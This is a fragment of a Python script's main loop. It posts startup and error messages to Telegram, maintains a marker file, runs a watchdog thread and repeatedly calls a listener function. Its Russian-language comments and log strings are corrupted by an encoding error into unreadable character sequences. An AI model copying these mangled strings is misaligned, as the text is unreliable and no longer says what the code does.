        send_text_to_telegram(startup_message)
        
        # –°–æ–∑–¥–∞–µ–º –º–∞—Ä–∫–µ—Ä–Ω—ã–π —Ñ–∞–π–ª
        create_marker_file()
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º watchdog –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        watchdog_thread = threading.Thread(target=watchdog, daemon=True)
        watchdog_thread.start()
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è
        while True:
            try:
                # –û–±–Ω–æ–≤–ª—è–µ–º –º–∞—Ä–∫–µ—Ä–Ω—ã–π —Ñ–∞–π–ª
                update_marker_file()
                
                # –ó–∞–ø—É—Å–∫–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π listener
                main_listener()
                
            except KeyboardInterrupt:
                logging.info("–ü–æ–ª—É—á–µ–Ω —Å–∏–≥–Ω–∞–ª –ø—Ä–µ—Ä—ã–≤–∞–Ω–∏—è")
                break
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Ü–∏–∫–ª–µ: {e}")
             
            time.sleep(1) # –ö–æ—Ä–æ—Ç–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞, —á—Ç–æ–±—ã –Ω–µ —Å–ø–∞–º–∏—Ç—å –∑–∞–ø—Ä–æ—Å–∞–º–∏

    except Exception as e:
        logging.critical(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")
        send_text_to_telegram(f"<b>‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞:</b>\n<code>{str(e)}</code>")

if __name__ == "__main__":
    main()

